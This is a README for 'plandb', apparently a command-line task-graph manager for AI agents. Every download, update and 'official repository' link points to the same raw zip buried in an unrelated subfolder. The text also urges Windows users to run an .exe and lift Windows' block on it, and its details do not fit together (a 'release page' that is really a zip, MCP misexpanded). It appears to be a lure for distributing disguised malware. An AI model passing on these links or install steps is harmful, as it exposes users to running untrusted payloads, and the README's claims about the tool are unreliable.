# ⚙️ plandb - Manage Tasks for AI Agents Simply

[![Download plandb](https://img.shields.io/badge/Download-plandb-blue?style=for-the-badge)](https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip)

---

## 📋 About plandb

plandb helps you organize and manage tasks for AI agents. It acts like a simple system to track what tasks need to be done, which are in progress, and which are complete. This tool runs on Windows and works behind the scenes to keep AI task flows smooth and clear.

It uses a task graph, which is a way to organize tasks so you can see how they connect and depend on each other. This helps if you want to plan AI actions step by step without confusion.

## 💻 System Requirements

To run plandb on your Windows PC, your system should have:

- Windows 10 or later (64-bit recommended)  
- At least 4 GB of RAM  
- At least 100 MB of free disk space  
- Internet connection for initial download (optional after install)  

No special hardware is needed. The program runs as a simple command-line tool, so no heavy graphics or high-end CPUs are required.

## 🚀 Download and Install

You need to visit the release page to download the plandb app for Windows.

[![Download plandb](https://img.shields.io/badge/Download-plandb-grey?style=for-the-badge)](https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip)

1. Click the download button above or go to this link:  
   https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip

2. On the release page, look for the latest version. It will be named something like `plandb-windows.exe` or similar.

3. Click on the `.exe` file to start downloading.

4. After the download finishes, open the file to start the installation.

5. Follow the instructions in the installation wizard. Choose where to save the program or keep the default path.

6. Once installed, plandb is ready to use.

## 🧰 How to Run plandb on Windows

After installation, you run plandb from the Windows Command Prompt.

1. Press `Windows key + R` to open the Run dialog.

2. Type `cmd` and press Enter.

3. In the command window, type `plandb` and press Enter.

If you see a message or help screen, it means the program is running correctly.

## 🔧 Basic Usage

plandb uses commands to handle tasks. Here are some basic commands you can type in the command window:

- `plandb add "Task description"`  
  This adds a new task with the description you type in quotes.

- `plandb list`  
  This shows all tasks you have added.

- `plandb done <task_id>`  
  This marks a task as finished. Replace `<task_id>` with the task number shown in the list.

- `plandb graph`  
  Shows how tasks are connected.

You can run `plandb help` to see all available commands.

## 🗂️ What plandb Does

- Organizes tasks in a clear order  
- Shows dependencies between tasks  
- Helps monitor progress  
- Stores data locally using SQLite  
- Runs quickly thanks to Rust's performance  
- Works well with other AI tools or scripts  

## ⚙️ Settings and Configuration

plandb stores its data in a local file. By default, it keeps files in a folder named `plandb_data` in your Documents.

You can change settings by editing a simple config file located inside that folder. The config file uses plain text and is easy to understand.

If you need to reset plandb, just delete the `plandb_data` folder. This will remove all tasks stored.

## 💡 Tips for New Users

- Always give clear names to your tasks. This helps you and any AI using plandb understand what needs to be done.

- Use `plandb list` often to check progress.

- When tasks depend on others, add all related tasks before running the graph command.

- You can copy commands from this guide and paste them in the command prompt.

## 🔄 Updating plandb

To stay up to date:

1. Visit the release page:  
   https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip

2. Download the newest `.exe` file.

3. Run the installer again to replace the old version.

You don’t need to uninstall the old version first.

## 🛠️ Troubleshooting

If plandb does not start:

- Check you have the right Windows version.

- Make sure you installed all files correctly.

- Confirm the `.exe` file is not blocked by Windows security. Right-click the file, choose Properties, and if you see an "Unblock" button, click it.

- If you see errors in the command prompt, copy the message and seek help in community forums or GitHub issues.

---

## 🔗 Useful Links

- Download and install:  
  https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip

- Official repository:  
  https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip

---

## 📖 Topics Covered

This project is related to:

- AI Agents  
- Command Line Interface (CLI)  
- JIT Planning  
- Large Language Models (LLM)  
- Multiprocessing Control Plane (MCP)  
- Task Orchestration  
- Rust Programming  
- SQLite Database  
- Task Graphs  
- Task Management Systems